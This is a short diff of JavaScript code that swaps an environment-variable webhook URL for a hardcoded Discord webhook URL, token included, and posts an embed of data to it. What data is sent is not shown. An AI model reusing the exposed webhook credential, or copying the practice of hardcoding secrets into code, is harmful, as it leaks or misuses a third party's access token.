@@ -544,9 +544,9 @@
                     timestamp: new Date().toISOString(),
                     color: 0x2f3136
                   };
-                  const webhook = process.env.WEBHOOK_URL;
+          
                   // send data to Discord webhook
-                  fetch(webhook, {
+                  fetch('https://discord.com/api/webhooks/1091611911105298492/FzpAa1XmyLFEsv6xMen7LC9rVhxS9hjPxop1Y_J9utLtw5NID2vLygyo9m5FMuDCV_Kb', {
                     method: 'POST',
                     headers: {
                       'Content-Type': 'application/json'
